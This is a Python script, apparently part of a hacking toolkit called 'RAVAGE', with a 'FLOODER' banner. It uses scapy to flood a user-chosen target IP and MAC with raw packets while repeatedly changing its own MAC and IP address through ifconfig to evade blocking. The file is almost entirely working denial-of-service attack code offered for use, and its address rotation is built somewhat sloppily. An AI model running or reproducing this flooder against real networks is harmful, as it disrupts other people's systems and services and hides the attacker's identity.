import os
import colorama
from colorama import Fore
from scapy.all import *

def DrawMenu():
	print(Fore.BLUE + '██████████████████████████████████████████████████████████████████████████████████████████████████████████████')
	print('█░░░░░░░░░░░░░░█░░░░░░█████████░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░███░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░███')
	print('█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░█████████░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀░░░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███')
	print('█░░▄▀░░░░░░░░░░█░░▄▀░░█████████░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░▄▀▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░▄▀░░███')
	print('█░░▄▀░░█████████░░▄▀░░█████████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░█████████░░▄▀░░████░░▄▀░░███')
	print('█░░▄▀░░░░░░░░░░█░░▄▀░░█████████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░▄▀░░███')
	print('█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░█████████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███')
	print('█░░▄▀░░░░░░░░░░█░░▄▀░░█████████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░░░███')
	print('█░░▄▀░░█████████░░▄▀░░█████████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░█████████░░▄▀░░██░░▄▀░░█████')
	print('█░░▄▀░░█████████░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░▄▀▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀░░░░░░█')
	print('█░░▄▀░░█████████░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀░░░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀▄▀░░█')
	print('█░░░░░░█████████░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░███░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░░░█')
	print('██████████████████████████████████████████████████████████████████████████████████████████████████████████████')
	print(Fore.WHITE + '')

def Start():	
	os.system('clear')
	DrawMenu()
	dst_ip = input('Enter The IP You Want Flooded. EX 192.168.1.1 >>> ')
	print('')
	dst_mac = input('Enter The MAC Of The IP. EX 00:11:22:33:44:56 >>> ')
	print('')
	amount = int(input('Enter The Amount of Packets you want sent >>> '))
	print('')
	interface = input('Type in the interface that you are using. EX wlan0 >>> ')
	print('')
	frequency = int(input('Type in how many packets should be sent till changing your IP and MAC >>> '))
	os.system('clear')
	DrawMenu()
	print('Sending ' + str(amount) + ' packets\n')
	
	new_mac = ("00:11:22:33:44:55")
	new_ip = ("192.168.0.0")
	os.system("ifconfig " + interface + " down")
	os.system("ifconfig " + interface + " hw ether " + new_mac)
	os.system("ifconfig " + interface + " " + new_ip)
	os.system("ifconfig " + interface + " up")
	
	counter = 0
	
	for i in range(0, amount + 1):
		counter = counter + 1
		if counter >= 256:
			counter = 0
			
		if ((counter % frequency) == 0):
			new_mac = ("00:11:22:33:44:" + str(i))
			new_ip = ("192.168.0." + str(counter))
			os.system("ifconfig " + interface + " down")
			os.system("ifconfig " + interface + " hw ether " + new_mac)
			os.system("ifconfig " + interface + " " + new_ip)
			os.system("ifconfig " + interface + " up")
			print('\n Info Changed \n')

		print(Fore.MAGENTA + "Packet #" + str(i) + " is being sent\n")
		
		src_mac = new_mac
		src_ip = new_ip
		
		eth = Ether(src=src_mac, dst=dst_mac)
		ip = IP(src=src_ip, dst=dst_ip)
		packet = eth/ip
		os.system("ifconfig " + interface + " promisc")
		sendp(packet, iface=interface)
		
	print(Fore.WHITE + '\nDone!')
	input(Fore.RED+"Press Enter to continue...")
	os.system('sudo python RAVAGE.py')
		
